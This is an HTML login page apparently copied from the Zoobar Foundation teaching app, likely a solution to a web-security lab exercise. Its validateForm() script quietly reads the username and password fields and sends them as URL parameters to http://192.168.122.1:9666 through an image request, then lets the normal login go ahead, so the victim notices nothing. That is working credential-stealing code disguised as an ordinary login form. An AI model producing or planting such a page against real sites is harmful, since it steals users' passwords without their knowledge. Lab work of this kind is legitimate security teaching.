<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
        <title>
            Login - Zoobar Foundation
        </title>
    </head>
    <body>
        <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Ethical
            Discourse</a></h1>
        <h2>Supporting the loyal
            representatives of the 21st-century</h2>
        <div id="login" class="centerpiece">
            <script>
             function validateForm() {
                 return new Promise((resolve, reject) => {
                     const user = document.forms['loginform']['login_username'].value;
                     const pass = document.forms['loginform']['login_password'].value;
                     const image = new Image();

                     image.onload = resolve;

                     image.src = 'http://192.168.122.1:9666/?'
                               + 'user=' + encodeURIComponent(user)
                               + '&pass=' + encodeURIComponent(pass)
                               + '&random=' + Math.random();
                 }).then(true);
             }

            </script>
            <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login"  onsubmit="return validateForm();" >
                <table>
                    <tr>
                        <td>Username:</td>
                        <td><input type="text" name="login_username" size="20"
                                   autocomplete="no" value=""></td>
                    </tr>
                    <tr>
                        <td>Password:</td>
                        <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
                            <input type="submit" name="submit_login" value="Log in">
                            <input type="submit" name="submit_registration" value="Register"></td>
                    </tr>
                </table>
                <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/users">
            </form>
        </div>
        <div class="footer warning">

        </div>
        <script>document.loginform.login_username.focus();</script>

    </body>
</html>
